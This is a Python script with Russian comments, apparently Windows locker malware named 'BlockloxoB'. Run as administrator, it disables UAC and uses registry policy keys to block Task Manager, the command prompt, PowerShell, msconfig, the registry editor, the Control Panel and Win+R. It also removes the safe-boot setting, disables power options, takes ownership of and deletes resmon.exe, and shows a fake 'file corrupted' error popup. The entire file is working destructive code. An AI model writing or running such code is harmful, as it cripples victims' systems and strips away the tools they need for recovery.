# new vers
# BlockloxoB.py
import os
import ctypes
import tkinter as tk
from tkinter import messagebox

def is_admin():
    """Проверяет, запущен ли скрипт с правами администратора"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def disable_uac():
    """Отключает UAC"""
    try:
        os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 0 /f')
        print("[+] UAC отключён! Перезагрузите систему для применения изменений.")
    except Exception as e:
        print(f"[-] Ошибка при отключении UAC: {e}")

def disable_tools():
    """Блокирует системные инструменты восстановления"""
    try:
        # Отключение UAC перед блокировкой инструментов
        disable_uac()

        # Отключение диспетчера задач
        os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f')

        # Отключение командной строки
        os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v DisableCMD /t REG_DWORD /d 1 /f')

        # Отключение PowerShell, msconfig, gpedit.msc
        os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v DisallowRun /t REG_DWORD /d 1 /f')
        os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun" /v "1" /t REG_SZ /d "powershell.exe" /f')
        os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun" /v "2" /t REG_SZ /d "msconfig.exe" /f')
        os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun" /v "3" /t REG_SZ /d "gpedit.msc" /f')

        # Отключение панели управления и настроек Windows
        os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f')

        # Отключение выполнения программ через Win+R
        os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoRun /t REG_DWORD /d 1 /f')

        # Удаление безопасного режима
        os.system('bcdedit /deletevalue "{current}" safeboot')

        # Отключение схем питания
        os.system('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Power" /v CsEnabled /t REG_DWORD /d 0 /f')
        os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoPowerOptions /t REG_DWORD /d 1 /f')

        # Удаление resmon.exe (Монитор ресурсов)
        os.system('takeown /f C:\\Windows\\System32\\resmon.exe /a')
        os.system('icacls C:\\Windows\\System32\\resmon.exe /grant Administrators:F')
        os.system('del /F /Q C:\\Windows\\System32\\resmon.exe')

        # Отключение редактора реестра
        os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f')

        print("[+] Все системные инструменты заблокированы, безопасный режим удалён, схемы питания отключены, resmon.exe удалён!")
    except Exception as e:
        print(f"[-] Ошибка: {e}")

def show_error_popup():
    """Выводит фейковое сообщение об ошибке"""
    root = tk.Tk()
#    root.withdraw()  # Скрываем основное окно
    messagebox.showerror("taskmgr.exe", "Не удалось запустить taskmgr.exe\nФайл поврежден. Код ошибки: l00h\n\nНа винду похоже?")
    root.destroy()

if __name__ == "__main__":
    if is_admin():
        disable_tools()
        show_error_popup()
       
        print("[+] Изменения внесены. Перезагрузите компьютер для применения настроек.")
        input("...")
#        os.system('shutdown -r -t 0')
    else:
        print("[!] Запустите скрипт от имени администратора!")
